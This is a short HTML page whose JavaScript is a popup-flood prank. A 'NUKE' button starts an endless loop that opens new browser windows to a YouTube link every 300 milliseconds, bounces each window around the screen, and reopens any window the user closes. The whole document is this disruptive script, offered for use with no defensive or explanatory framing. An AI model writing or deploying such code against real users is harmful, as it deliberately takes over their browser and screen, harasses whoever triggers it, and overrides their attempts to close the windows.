<button id="nuke">NUKE</button>

<script>
const NUKE_URL = "https://youtu.be/thPv_v7890g?si=s1KycAT0KyzCbtDj";
let nuking = false;

document.getElementById("nuke").onclick = () => {
    if (!nuking) {
        nuking = true;
        loopSpawn();   // start infinite spawning
    }
};

// LOOP: keeps creating windows forever
function loopSpawn() {
    procreate();
    setTimeout(loopSpawn, 300); // adjust spawn speed
}

// CREATE + RESPAWN + BOUNCE
function procreate() {
    const w = 400;
    const h = 300;

    const win = window.open(
        NUKE_URL,
        "_blank",
        `width=${w},height=${h},left=100,top=100`
    );

    if (!win) return;

    // random movement
    let dx = (Math.random() * 8) + 4;
    let dy = (Math.random() * 8) + 4;

    playBall(win, w, h, dx, dy);

    // RESPAWN IF CLOSED
    const watcher = setInterval(() => {
        if (win.closed) {
            clearInterval(watcher);
            procreate(); // instantly recreate the window
        }
    }, 200);
}

// BOUNCING PHYSICS
function playBall(win, w, h, dx, dy) {
    const screenW = window.screen.availWidth;
    const screenH = window.screen.availHeight;

    function step() {
        if (win.closed) return;

        let x = win.screenX + dx;
        let y = win.screenY + dy;

        if (x <= 0 || x + w >= screenW) dx = -dx;
        if (y <= 0 || y + h >= screenH) dy = -dy;

        win.moveTo(x, y);

        requestAnimationFrame(step);
    }

    step();
}
</script>
